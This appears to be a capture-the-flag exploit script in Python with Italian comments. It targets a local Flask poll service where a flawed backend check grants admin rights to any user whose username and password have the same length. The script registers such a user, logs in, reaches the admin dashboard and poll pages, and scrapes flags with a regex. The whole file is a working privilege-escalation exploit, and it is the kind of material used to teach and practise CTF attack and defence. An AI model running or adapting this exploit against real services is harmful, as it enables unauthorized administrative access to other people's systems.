'''

Vulnerabilità: Privilege Escalation / weak access control
L'obiettivo di questo exploit/attacco è quello di catturare flag accedendo come admin. La vulnerabilità interessa un
controllo effettuato nel backend che verifica se un utente si registra con credenziali che hanno la stessa dimensione
(numero di caratteri di username e password).
In questo modo il ruolo di admin non è più solo esclusivo per l'utente admin, ma qualsiasi utente che si logghi con credenziali
che soddisfano questa condizione può diventare admin e sfruttare in maniera pericolosa tutte quelle che sono le azioni 
privilegiate che spettano ad un admin appunto.

'''



import requests
import random
import string
import re

# IP locale e port per il server Flask
ip = "127.0.0.1"
port = 5000

# Regex per cercare la flag
flag_regex = re.compile(r"[A-Z0-9]{31}=")




def exploit():
    try:
        # Generazione casuale di un utente con lunghezza username uguale alla lunghezza password
        # (uno dei più banali tentativi di assegnazione dei privilegi di admin)
        username_length = random.randint(5, 64)
        password_length = username_length
        username = ''.join(random.choices(string.ascii_letters + string.digits, k = username_length))
        password = ''.join(random.choices(string.ascii_letters + string.digits, k = password_length))

        print(f"Registrando l'utente con username: {username} e password: {password}")
        utente = {
            'utente': username,
            'password': password
        }

        # Creiamo una sessione per l'utente
        s = requests.Session()

        # Registrazione dell'utente
        register_response = s.post(f"http://{ip}:{port}/register", data=utente)
        print(f"Status code della registrazione: {register_response.status_code}")
        if register_response.status_code != 200:
            print(f"Errore durante la registrazione per {username}")
            return

        # Login dell'utente
        login_response = s.post(f"http://{ip}:{port}/login", data=utente)
        print(f"Status code del login: {login_response.status_code}")
        if login_response.status_code != 200:
            print(f"Errore durante il login per {username}")
            return
    

        # Tentiamo di accedere alla dashboard di admin
        admin_dashboard_response = s.get(f"http://{ip}:{port}/admin_dashboard")
        print(f"Status code della dashboard admin: {admin_dashboard_response.status_code}")
        if admin_dashboard_response.status_code == 200:
            print("Privilegi elevati ottenuti con successo!")

            # Se l'accesso alla dashboard di admin ha funzionato (code = 200), possiamo cercare la flag nei sondaggi
            admin_polls_response = s.get(f"http://{ip}:{port}/admin_polls")
            print(f"Status code dell'accesso ad admin_polls: {admin_polls_response.status_code}")
            print(admin_polls_response.text)
            if admin_polls_response.status_code == 200:
                flags = set(flag_regex.findall(admin_polls_response.text))
                if flags:
                    print(f"Trovate flag da {ip}: {flags}")
                else:
                    print("Nessuna flag trovata nei sondaggi.")
            else:
                print("Errore nell'accesso ai sondaggi admin.")
        else:
            print("Errore nell'accesso alla dashboard admin.")

    except Exception as e:
        print(f"Errore durante l'exploit per {ip}: {str(e)}")




# Esecuzione dell'exploit
if __name__ == '__main__':
    exploit()
